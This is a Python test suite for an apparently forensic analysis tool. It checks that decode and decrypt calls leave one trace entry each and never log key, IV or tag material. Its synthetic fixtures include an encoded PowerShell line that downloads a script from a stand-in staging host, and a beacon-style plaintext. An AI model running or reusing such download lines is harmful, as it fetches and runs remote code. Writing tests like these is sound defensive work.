"""The decode and decrypt tools leave one trace entry per call, written by
the middleware's baseline: the result text the model read (so a value in a
decoded script can be sighted), its arguments and its failure; the
decryption key material never reaches the trace. Data is synthetic."""
from __future__ import annotations

import asyncio
import base64
import json
import os
from pathlib import Path
from unittest.mock import MagicMock, patch

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def _ctx(tool_name: str, args: dict):
    msg = MagicMock()
    msg.name = tool_name
    msg.arguments = args
    msg.model_copy = MagicMock(return_value=msg)
    ctx = MagicMock()
    ctx.message = msg
    ctx.copy = MagicMock(return_value=ctx)
    return ctx


def _log(tmp_path):
    from core.evidence_inventory_gate import mark_inventory_complete
    from core.execution_log import ExecutionLog
    (tmp_path / "analysis").mkdir(exist_ok=True)
    (tmp_path / "evidence").mkdir(exist_ok=True)
    mark_inventory_complete(tmp_path, summary={"test_fixture": True})
    log = ExecutionLog()
    log.configure("CASE-A", str(tmp_path / "analysis" / "trace.json"))
    log.record_dair_call("Triage", "", False, "", "", "stay", "")
    return log


def _run(log, tool_name: str, fn, args: dict) -> tuple[dict, list[dict]]:
    from core.middleware import NarrationMiddleware
    before = len(log._entries)

    async def call_next(_ctx):
        return fn(**args)
    with patch("core.execution_log.log", log):
        result = asyncio.run(NarrationMiddleware().on_call_tool(_ctx(tool_name, args), call_next))
    return result, [e for e in log._entries[before:] if e.get("type") == "tool_call"]


def _traced_text(entry: dict) -> str:
    spill = entry.get("stdout_file") or ""
    held = Path(spill).read_text(encoding="utf-8") if spill and os.path.isfile(spill) else ""
    return " ".join([str(entry.get("stdout_excerpt") or ""), str(entry.get("args") or ""), held])


def test_a_decode_leaves_one_entry_holding_the_decoded_text_and_its_arguments(tmp_path):
    from tools.deobfuscation import decode_chain
    log = _log(tmp_path)
    blob = base64.b64encode(b"Invoke-WebRequest https://stage.example.com/a.ps1").decode()
    result, entries = _run(log, "deob_decode_chain", decode_chain, {"data": blob, "operations": ["base64"]})
    assert result["success"] is True
    assert len(entries) == 1
    e = entries[0]
    assert e["cmd"] == "<py>:deob_decode_chain" and e["success"] is True
    assert "stage.example.com" in e["stdout_excerpt"]
    assert json.loads(e["args"])["operations"] == ["base64"]
    assert not any(str(x.get("stdout_excerpt") or "").startswith('{"ops"') for x in log._entries)


def test_a_failed_decode_leaves_one_failed_entry(tmp_path):
    from tools.deobfuscation import decode_chain
    log = _log(tmp_path)
    result, entries = _run(log, "deob_decode_chain", decode_chain, {"data": "zz", "operations": ["hex"]})
    assert result["success"] is False
    assert len(entries) == 1
    assert entries[0]["success"] is False and entries[0]["exit_code"] == 1


def _gcm(tmp_path, plain: bytes):
    key, nonce = os.urandom(32), os.urandom(12)
    enc = Cipher(algorithms.AES(key), modes.GCM(nonce)).encryptor()
    ct = enc.update(plain) + enc.finalize()
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(ct + enc.tag)
    return blob, key.hex(), nonce.hex()


def test_a_failed_decrypt_leaves_one_failed_entry_without_the_key(tmp_path):
    from tools.crypto import decrypt
    log = _log(tmp_path)
    blob, _key, nonce = _gcm(tmp_path, b"synthetic plaintext for CASE-A")
    wrong = os.urandom(32).hex()
    args = {"input_path": str(blob), "algo": "aes", "key": wrong, "iv": nonce, "mode": "gcm",
            "key_encoding": "hex", "output_path": str(tmp_path / "analysis" / "out.dec")}
    result, entries = _run(log, "crypto_decrypt", decrypt, args)
    assert result["success"] is False
    assert len(entries) == 1
    e = entries[0]
    assert e["success"] is False and e["exit_code"] == 1
    traced = _traced_text(e)
    assert wrong not in traced and nonce not in traced
    assert json.loads(e["args"])["mode"] == "gcm"


def test_a_decrypt_leaves_no_key_iv_or_tag_in_any_trace_entry_or_the_index(tmp_path, monkeypatch):
    """The success path runs `file` through the executor: that entry is the
    call's own record (the baseline is not written). No entry, excerpt,
    spill or the evidence index holds a key, IV or tag; the model's result
    keeps the key it resolved to. The stamp of a self-logged entry is pinned
    by the next test (here the tool body runs in the watchdog's thread,
    whose entries carry no action id and are not stamped)."""
    from tools.crypto import decrypt
    monkeypatch.setenv("ATLAS_IOC_SIGHTINGS", "1")
    log = _log(tmp_path)
    key, nonce = os.urandom(32), os.urandom(12)
    enc = Cipher(algorithms.AES(key), modes.GCM(nonce)).encryptor()
    ct = enc.update(b"beacon to relay.example.org every 60 s") + enc.finalize()
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(ct)
    decoy = os.urandom(32).hex()
    secrets = (key.hex(), decoy, nonce.hex(), enc.tag.hex())
    args = {"input_path": str(blob), "algo": "aes", "key": [decoy, key.hex()], "iv": nonce.hex(),
            "tag": enc.tag.hex(), "mode": "gcm", "key_encoding": "hex",
            "output_path": str(tmp_path / "analysis" / "out.dec")}
    result, entries = _run(log, "crypto_decrypt", decrypt, args)
    assert result["success"] is True and result["key_used"] == key.hex()     # the model still reads it
    assert entries        # the executor's `file` entry: the call's own record
    traced = " ".join(_traced_text(e) + json.dumps(e, default=str) for e in log._entries)
    index = b"".join(f.read_bytes() for f in (tmp_path / "analysis").glob("evidence_index.db*"))
    for secret in secrets:
        assert secret not in traced and secret.encode() not in index


def test_the_baseline_withholds_the_key_from_args_excerpt_and_spill(tmp_path):
    log = _log(tmp_path)
    key, iv = "00112233445566778899aabbccddeeff", "ffeeddccbbaa99887766554433221100"
    plain = "beacon to relay.example.org every 60 s " * 400        # long enough to spill

    def tool(**_kw):
        return {"success": True, "key_used": key, "preview": plain, "algo": "aes"}
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(b"\0" * 32)
    _result, entries = _run(log, "crypto_decrypt", tool,
                            {"input_path": str(blob), "algo": "aes", "key": [key], "iv": iv, "tag": iv})
    assert len(entries) == 1
    e = entries[0]
    traced = _traced_text(e)
    assert "relay.example.org" in traced and e.get("stdout_file")
    assert key not in traced and iv not in traced
    assert json.loads(e["args"]) == {"input_path": str(blob), "algo": "aes"}


def test_a_self_logged_entry_is_stamped_without_the_key_material(tmp_path):
    """A tool that logs its own entry in the call's context (an executor
    program) gets the call's arguments stamped on that entry
    (_stamp_call): never the key, IV or tag."""
    log = _log(tmp_path)
    key, iv = "00112233445566778899aabbccddeeff", "ffeeddccbbaa99887766554433221100"
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(b"\0" * 32)

    def tool(**_kw):
        log.record_tool_call("file -b analysis/out.dec", True, False, 0, 0, stdout_excerpt="data")
        return {"success": True, "key_used": key, "preview": "x", "algo": "aes"}
    _result, entries = _run(log, "crypto_decrypt", tool,
                            {"input_path": str(blob), "algo": "aes", "key": [key], "iv": iv, "tag": iv})
    assert len(entries) == 1 and entries[0]["cmd"] == "file -b analysis/out.dec"
    assert json.loads(entries[0]["args"]) == {"input_path": str(blob), "algo": "aes"}
    assert key not in json.dumps(log._entries, default=str) and iv not in json.dumps(log._entries, default=str)


def test_a_refused_decrypt_records_its_arguments_without_the_key_material(tmp_path, monkeypatch):
    """A call a pre-call gate refuses is recorded with its arguments, never
    the key, IV or tag."""
    import pytest
    from fastmcp.exceptions import ToolError
    log = _log(tmp_path)
    key = "00112233445566778899aabbccddeeff"
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(b"\0" * 32)
    monkeypatch.setattr("tools.evidence_compat.check_tool_against_profile",
                        lambda *_a, **_k: {"success": False, "error": "no such artifact class in this case"})

    def tool(**_kw):
        raise AssertionError("the gate refuses before the tool runs")
    with pytest.raises(ToolError):
        _run(log, "crypto_decrypt", tool, {"input_path": str(blob), "algo": "aes", "key": key, "iv": key})
    abandoned = [e for e in log._entries if e.get("type") == "call_abandoned"]
    assert abandoned and json.loads(abandoned[-1]["args"]) == {"input_path": str(blob), "algo": "aes"}
    assert key not in json.dumps(log._entries, default=str)


def test_a_decrypt_the_input_kind_gate_refuses_records_no_key_material(tmp_path, monkeypatch):
    """The wrong-input-kind gate's refusal entry carries the call's
    arguments, never the key or IV."""
    import pytest
    from fastmcp.exceptions import ToolError
    log = _log(tmp_path)
    key = "00112233445566778899aabbccddeeff"
    blob = tmp_path / "evidence" / "blob.enc"
    blob.write_bytes(b"\0" * 32)

    def refuse(*_a, **_k):
        raise ValueError(json.dumps({"success": False, "gate": "wrong_input_kind",
                                     "error": "not an encrypted blob"}))
    monkeypatch.setattr("core.input_kind.check_tool_input_kind", refuse)

    def tool(**_kw):
        raise AssertionError("the gate refuses before the tool runs")
    with pytest.raises(ToolError):
        _run(log, "crypto_decrypt", tool, {"input_path": str(blob), "algo": "aes", "key": key, "iv": key})
    abandoned = [e for e in log._entries if e.get("type") == "call_abandoned"]
    assert abandoned and "wrong-input-kind" in abandoned[-1]["reason"]
    assert json.loads(abandoned[-1]["args"]) == {"input_path": str(blob), "algo": "aes"}
    assert key not in json.dumps(log._entries, default=str)
